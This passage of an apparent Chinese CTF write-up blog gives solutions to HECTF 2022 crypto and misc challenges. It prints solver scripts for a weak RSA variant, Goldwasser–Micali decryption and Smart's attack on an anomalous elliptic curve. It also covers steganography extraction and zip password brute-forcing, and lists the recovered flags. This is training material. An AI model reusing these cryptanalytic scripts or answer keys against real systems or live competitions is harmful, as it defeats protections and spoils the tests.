class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, hint, e1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mygenerate</span>():</span></span><br><span class="line"> <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">     p = getPrime(<span class="number">512</span>)</span><br><span class="line">     <span class="keyword">if</span> p % <span class="number">8</span> == <span class="number">5</span>:</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"> g = p-random.randint(<span class="number">1</span> &lt;&lt; <span class="number">13</span>, <span class="number">1</span> &lt;&lt; <span class="number">15</span>)</span><br><span class="line"> q = sympy.nextprime(math.gamma(g+<span class="number">1</span>) % p)</span><br><span class="line"> <span class="keyword">return</span> p, g, q</span><br><span class="line"></span><br><span class="line">p, g, q = mygenerate()</span><br><span class="line">n = p*q</span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">m1 = bytes_to_long(flag)</span><br><span class="line">m2 = bytes_to_long(hint)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e1, p)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e2, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p =&#x27;</span>+<span class="built_in">str</span>(p))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;g =&#x27;</span>+<span class="built_in">str</span>(g))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c1 =&#x27;</span>+<span class="built_in">str</span>(c1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c2 =&#x27;</span>+<span class="built_in">str</span>(c2))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672846909</span></span><br><span class="line"><span class="string">g =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672815766</span></span><br><span class="line"><span class="string">c1 =6235217214618484469008717065109058585860810027126999050539741461978786126300064219884646722757808536523766850480291000964963856026236813451563022630637528</span></span><br><span class="line"><span class="string">c2 =11968687437667021636457941077557698735979559596315355015261643918655719362366246657937192921814834456270616376603153881488026042955084056042773344426448580968726245676672896245296438903588066436834165402064132845092674100931069500643230951702318353312541552786636249326131049369846465301549915712690800690627</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>素因子的生成函数中，</p><p>$q=\text{nextprime}(\Gamma(g+1) \bmod p)=\text{nextprime}(g! \bmod p)=\text{nextprime}((p-r)! \bmod p)$</p><p>结合威尔逊定理 $(p-2)! \equiv 1 \pmod p$，有</p><p>$q = \text{nextprime}(\prod\limits_{k=2}^{r-1}(p-k)^{-1} \bmod p)$</p><p>求出 $p,q$ ，RSA解密得hint：$e_1=2$，再解密得 $m$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line">p =<span class="number">8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672846909</span></span><br><span class="line">g =<span class="number">8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672815766</span></span><br><span class="line">c1 =<span class="number">6235217214618484469008717065109058585860810027126999050539741461978786126300064219884646722757808536523766850480291000964963856026236813451563022630637528</span></span><br><span class="line">c2 =<span class="number">11968687437667021636457941077557698735979559596315355015261643918655719362366246657937192921814834456270616376603153881488026042955084056042773344426448580968726245676672896245296438903588066436834165402064132845092674100931069500643230951702318353312541552786636249326131049369846465301549915712690800690627</span></span><br><span class="line">r = p-g</span><br><span class="line">q = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,r):</span><br><span class="line">    q = q*inverse_mod(p-k,p)%p</span><br><span class="line">q = sympy.nextprime(q)</span><br><span class="line">n = p*q</span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d2 = inverse_mod(e2,f)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2,d2,n)</span><br><span class="line">hint = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m2)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(hint)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Here, e1=2, think about whether you can still use rsa to solve problems&#x27;</span></span><br><span class="line"></span><br><span class="line">e1 = <span class="number">2</span></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f = x ^ e1 - c1</span><br><span class="line">x = f.monic().roots()[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">flag= <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(x)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;HECTF&#123;Happy_120th_birthday_to_Hebei_Normal_University&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="onebit"><a href="#onebit" class="headerlink" title="onebit"></a>onebit</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Le</span>(<span class="params">n, p</span>):</span></span><br><span class="line"> <span class="keyword">return</span> <span class="built_in">pow</span>(n, (p - <span class="number">1</span>) // <span class="number">2</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span>(<span class="params">message, n, g</span>):</span></span><br><span class="line"> ciphertext = []</span><br><span class="line"> <span class="keyword">for</span> i, m <span class="keyword">in</span> <span class="built_in">enumerate</span>(message):</span><br><span class="line">     k = random.randint(<span class="number">1</span>, <span class="number">2</span>**<span class="number">512</span>)</span><br><span class="line">     c = ((g**<span class="built_in">int</span>(m)) * (k ** <span class="number">2</span>)) % n</span><br><span class="line">     ciphertext.append(c)</span><br><span class="line"> <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"> g = getPrime(<span class="number">512</span>)</span><br><span class="line"> <span class="keyword">if</span> Le(g, p) == p-<span class="number">1</span> <span class="keyword">and</span> Le(g, q) == q-<span class="number">1</span>:</span><br><span class="line">     <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">m = <span class="built_in">str</span>(<span class="built_in">bin</span>(m))[<span class="number">2</span>:]</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">c = Encrypt(m, n, g)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(p)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(g)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(c))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure></blockquote><p>加密结果 $c=g^mk^2$，符合GM同态加密系统，分别判断 $c_i$ 是否为基于模 $p$ 的二次剩余即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">10314655380768703978472206709958842273413011533146844672390572314617934317138270085463277616223314361910177207125628813385040318943783776184128231730068517</span></span><br><span class="line">g = <span class="number">8263101522955373984025637723346797526375555424855735493538626380254785750558737652925053637878963928060840011944043285344527052241847201267694354571887089</span></span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> c:</span><br><span class="line">    cipher = <span class="built_in">int</span>(k)</span><br><span class="line">    <span class="keyword">if</span> gmpy2.jacobi(cipher,p) == -<span class="number">1</span>:</span><br><span class="line">        plaintext += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        plaintext += <span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(plaintext,<span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;HECTF&#123;359dbb32-04d5d9c6-7d463ebc-741c7454&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="mixture"><a href="#mixture" class="headerlink" title="mixture"></a>mixture</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">p=<span class="number">235322474717419</span></span><br><span class="line">a=<span class="number">0</span></span><br><span class="line">b=<span class="number">8856682</span></span><br><span class="line">k=</span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">P = E.random_point()</span><br><span class="line">P.order()==p</span><br><span class="line">Q=k*P</span><br><span class="line">aes_key=k</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;P:&quot;</span>,P)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Q:&quot;</span>,Q)</span><br><span class="line"><span class="comment">#P=E(180571547161769,227820272156445)</span></span><br><span class="line"><span class="comment">#Q=E(76765539897460,69715189045993)</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">aes_key = <span class="string">b&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">text</span>):</span></span><br><span class="line"> <span class="keyword">while</span> <span class="built_in">len</span>(text) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">     text += <span class="string">b&#x27; &#x27;</span></span><br><span class="line"> <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad_key</span>(<span class="params">key</span>):</span></span><br><span class="line"> <span class="keyword">while</span> <span class="built_in">len</span>(key) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">     key += <span class="string">b&#x27; &#x27;</span></span><br><span class="line"> <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line">aes = AES.new(pad_key(aes_key), AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">plain_text = <span class="string">b&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line">enc_text = aes.encrypt(pad(plain_text))</span><br><span class="line">enc_text_b64=base64.b64encode(enc_text)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(enc_text_b64)</span><br><span class="line"><span class="comment">#bXaw/g8fD7taMjlL/OyqUJluD6dZI5GkZb9RrE5GQk8=</span></span><br></pre></td></tr></table></figure></blockquote><p>ECC+AES。</p><p>ECC满足 $P.\text{order}()=p$，利用Smart’s Attack解 $k$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">235322474717419</span></span><br><span class="line">a = <span class="number">0</span></span><br><span class="line">b = <span class="number">8856682</span></span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">P = E(<span class="number">180571547161769</span>,<span class="number">227820272156445</span>)</span><br><span class="line">Q = E(<span class="number">76765539897460</span>,<span class="number">69715189045993</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SmartAttack</span>(<span class="params">P,Q,p</span>):</span></span><br><span class="line">    E = P.curve()</span><br><span class="line">    Eqp = EllipticCurve(Qp(p, <span class="number">2</span>), [ ZZ(t) + randint(<span class="number">0</span>,p)*p <span class="keyword">for</span> t <span class="keyword">in</span> E.a_invariants() ])</span><br><span class="line"></span><br><span class="line">    P_Qps = Eqp.lift_x(ZZ(P.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> P_Qp <span class="keyword">in</span> P_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(P_Qp.xy()[<span class="number">1</span>]) == P.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> Q_Qp <span class="keyword">in</span> Q_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(Q_Qp.xy()[<span class="number">1</span>]) == Q.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    p_times_P = p*P_Qp</span><br><span class="line">    p_times_Q = p*Q_Qp</span><br><span class="line"></span><br><span class="line">    x_P,y_P = p_times_P.xy()</span><br><span class="line">    x_Q,y_Q = p_times_Q.xy()</span><br><span class="line"></span><br><span class="line">    phi_P = -(x_P/y_P)</span><br><span class="line">    phi_Q = -(x_Q/y_Q)</span><br><span class="line">    k = phi_Q/phi_P</span><br><span class="line">    <span class="keyword">return</span> ZZ(k)</span><br><span class="line"></span><br><span class="line">k = SmartAttack(P, Q, p)</span><br><span class="line"><span class="built_in">print</span>(k)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 152675955744921</span></span><br></pre></td></tr></table></figure><p>再代入还原AES解密即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">aes_key = <span class="string">b&#x27;152675955744921&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad_key</span>(<span class="params">key</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(key) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        key += <span class="string">b&#x27; &#x27;</span></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line">aes = AES.new(pad_key(aes_key), AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">enc_text_b64 = <span class="string">&#x27;bXaw/g8fD7taMjlL/OyqUJluD6dZI5GkZb9RrE5GQk8=&#x27;</span></span><br><span class="line">enc_text = base64.b64decode(enc_text_b64)</span><br><span class="line">plain_text = aes.decrypt(enc_text)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plain_text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;HECTF&#123;N0w_you_know_ecc_and_AES!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="xyz"><a href="#xyz" class="headerlink" title="xyz"></a>xyz</h3><p>由于素数 $x \in (2^{11},2^{12})$，爆破 $x$ ，再解关于 $y,z$ 的二元一次模方程组，根据式2将 $z$ 代入式1，得到关于 $y$ 的模方程，爆破求解 $m_1,m_2$，直到得到满足flag格式的值即解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">90269941327372741986138990624471228922188543388582792147052657918058877926048530226733915401487146960603412188605706389044850057749941283247036686933647699313789471852317821572828450212687824860596198164570332523289084374240518841959770316611451490236432102245045517406282462838053843074444594398723921432791</span></span><br><span class="line">a = <span class="number">76528144673843458522824450076110371539627923753787397683655100259800630176098551106179842548579216667636910919853615859002981078385969868960955053568271518271225085057932965836858836455161323221071080085783042898199649213810735170960799816250402517689895712143360516054216300443029075429435539217594182165579</span></span><br><span class="line">b = <span class="number">29135602763193779141406655503080226411846533327113770010672935904333289317045484412179311504151348405577659318044617676010167479271362994129802985294731037903701693595616818788260673254684442485084195062784616665615921849434909060917998818395292558822723253741815121539892159313890553027457549798418207587319</span></span><br><span class="line"></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line"><span class="keyword">if</span> i.bit_length()==<span class="number">12</span> <span class="keyword">and</span> gmpy2.is_prime(i):</span><br><span class="line">s.append(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s))</span><br><span class="line"></span><br><span class="line">ey = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> s:</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line">    P.&lt;y&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">    z = (b - x^<span class="number">12</span> - y^<span class="number">12</span>)*inverse_mod(<span class="number">120</span>*x,p)</span><br><span class="line">    g = (<span class="number">12</span> * x + <span class="number">12</span> * y + y * z + x * z ** <span class="number">12</span>) - a</span><br><span class="line">    roots = g.monic().roots()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(roots)&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> roots:</span><br><span class="line">            ee = x</span><br><span class="line">            yy = k[<span class="number">0</span>]</span><br><span class="line">            zz = (b - x^<span class="number">12</span> - yy^<span class="number">12</span>)*inverse_mod(<span class="number">120</span>*x,p)%p</span><br><span class="line">            d = inverse_mod(ee, p-<span class="number">1</span>)</span><br><span class="line">            m1 = <span class="built_in">pow</span>(yy, d, p)</span><br><span class="line">            m2 = <span class="built_in">pow</span>(zz, d, p)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;48454354467b&#x27;</span> <span class="keyword">in</span> <span class="built_in">hex</span>(m1)[<span class="number">2</span>:]:</span><br><span class="line">                <span class="built_in">print</span>(x)</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m1)[<span class="number">2</span>:]+<span class="built_in">hex</span>(m2)[<span class="number">2</span>:]))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line"><span class="comment"># 3989</span></span><br><span class="line"><span class="comment"># HECTF&#123;46de31725b9a50b20e27cab2ddd5f5845cdd19066b4f97612&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="咦-小鲨鱼来喽"><a href="#咦-小鲨鱼来喽" class="headerlink" title="咦~小鲨鱼来喽"></a>咦~小鲨鱼来喽</h3><p>wireshark打开流量文件，逐个流查看，一眼找到flag。</p><p>​    </p><h3 id="来玩捉迷藏呀"><a href="#来玩捉迷藏呀" class="headerlink" title="来玩捉迷藏呀"></a>来玩捉迷藏呀</h3><blockquote><p>你能寻找到真正的我吗？</p></blockquote><p>png图片有lsb隐写，zsteg提取出内容： <code>zsteg -E &quot;b1,rgb,lsb,xy&quot; 1010.png &gt; out1.txt</code>，</p><p>得到16进制字符串转string，再xor 0x33发现zip压缩包头，提取出zip压缩包，解压得到flag.doc，将文字全选设置颜色，发现flag：<code>HECTF&#123;hah0ha_Find-Me!!!&#125;</code>。</p><p>​    </p><h3 id="你把我flag藏哪去了"><a href="#你把我flag藏哪去了" class="headerlink" title="你把我flag藏哪去了?"></a>你把我flag藏哪去了?</h3><p>flag.docx中打开隐藏文字，得到的base64解码得第一段字符串：</p><p><code>kgkhlfloanaiufpghhalwujklkmownplkmwlygalpmfkgyggihuldlgaoyuloiggrplkvkgmrkaqzxemmiwklhugekleolpaaolffmaghmfgfmgvgjnblpmlajapufjlgplaojpjbffbjbwhuglggyjngmlbfygljbgxkixlmmqiksmpaqyojerafekadxdxxbarxlgngymsimhvuwkaexsglrapggkabmfulgvnmajufoekymalimxdijjpxyiagbpmkuallnlkpoeagfldlposkizvyxraazxrgxanoihqlxfogfgglpgjylkeakbylfvjomllkgjgymgfdlrpeqfklfslmejilpjiklpaapglxyevfkylfappbkdzflffllikqnialkbhjorndhsfomfaypghpqoxryimhfllfhlmkoreamroakgrljahmfailijanykfuaihfbzafaufmsffngfalmrbfflfaffwlnjmfgaaffauazjfijxiabfirmovpzekirbasfjsgzlukolyvohmvaalpkahsxfzammbfnmldzyaauifldvkmzbgfybaoffrflfoaadgmllnbgfpnrgxllyphyfnlexbvdnlokgoyilprflonshalkjaxngbjhlmbpdlamhkjfnlgmaagfjnjgkfrizlfflpmmglapxgmuninaaupkpfdigpsasmvkdjvgiyofdumpngpaljkjblfhahskiokpfgaayhnnfdsxkffqjaazvvdosefppfofigyamfnfngvlaoapdyixvbfdosobmlubaiugjxhfyfkvrakazgluyilpvgfwgynqggplbkwiiaxarlaflaalfkxfjlpegmmajngujlofuiffmvikfimraogqalalfmgubagfggoaakgrfqfhaemosraafyfopukudaalfggimhdfognhkrleflpalgalfapyjalgvoklgfllgaflaafafmazygpehfkzhlazngfmofliazlvnxanalugjlafovljfjubzgapehhfkfnfnggpalylivfegaaidrmyjagfalgmagflrklugadpffuaaky</code></p><p>otherflag.txt中含有零宽字符，利用在线网站提取出第二段字符串：</p><p><code>flpfypbgfeapwpsnlwklawllgryafjslgnbwapdfpzbpauanalfopwfpiabloaallziffklfggufrajpifgjfpakfmxpbsulvjsgmflgalagfnarslkbakuyfggagkfglnalduvqeayjgajmngeglnggxlngfmjmigkkiumlnfdwlkmaugngnvrrbfzxzyauauehofnemfmfffabbgvldlyhoaqjomfplapvhaaakogfirfvamkffygakampauuooolgpnnuelhffhvvisukwynmiglnllumhajekuguuplrxkiaeffllfkayrffggfffgyvpufvpbgagfaekipailovaffanuxsjgvjdqkvfuikflafmdkbbnkpgfxrqpfglavgslujjlffulhugzliumaadngwihmmojfbhxvomafpbfhaviwlguefogppmjsplglfhlgrklbisphajpgnhlispnaskklljggklzaffhnelnfyrymgaghfifojmjjsekoomffffuaawbdgaqrmgzprvgwzjxefhjadkikurllllljoghmlwfflfmlovfplnaqpeozloadkeiolfklivuylzbjooxlsglngduvxanahjgepgu&#125;klghplmvzilkpggpholgiogjavpagjhdonunlpgolndqbqfdmbpjjoxbomlikyuipnxqxzlifforghheuyyazhjuagfwaulrjlfxoiggyjfbfpjigkgyafplfpqwadiqniavvgufjdjlifjiorymvfxmxgorilyldfhofbbygflgairjdidgdqvikjoliyfdzhfrognyyibkgnnvhmjlolfgvwfijlggfkpakpgflfydvfwydofkhgiygwllwljogrqvzjlffgllallblpkfbsflhrajdgowprdblubflyoybhvhwfwoeiagnxbzniffpllxmfknuihfobfeefkkgkynnglkkldugmgsvnphlafgsrnroehvffwapnfjfpglrkpafhlsjgriplrfldglznhonfdlohosfhohegknaiamjflnboplllxluigoxlkrbglrgebaggriaefmzlqidofgafqgbgdilnmhoaionobfynlgozadgvvimxoboaikkfxwirorpflluzhophfdliekljyomejklgffjnunh&#123;opgdafgamla</code></p><p>看字符串无规律，猜测为字符频率统计，找一个<a href="https://uutool.cn/str-statistics/">在线工具</a>统计字符出现次数，按结果从大到小排序取出对应字符为 <code>flagkpomijnhuybrvdxezswq&#123;&#125;</code>，调整括号位置即为flag：<code>flag&#123;kpomijnhuybrvdxezswq&#125;</code>。</p><p>​    </p><h3 id="我的手要不行辣"><a href="#我的手要不行辣" class="headerlink" title="我的手要不行辣"></a>我的手要不行辣</h3><p>图片内文字用在线OCR识别转文字，hex转字符，根据文件头转存为zip压缩包，使用ARCHPR爆破出密码8686，解压得到txt内为音符加密，使用<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">在线解密工具</a>解密得到flag：<code>flag&#123;y0u_fi0d_m2_f1ag&#125;</code>。</p><p>​    </p><h3 id="2022HECTF调查问卷"><a href="#2022HECTF调查问卷" class="headerlink" title="2022HECTF调查问卷"></a>2022HECTF调查问卷</h3><p>写问卷得flag。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
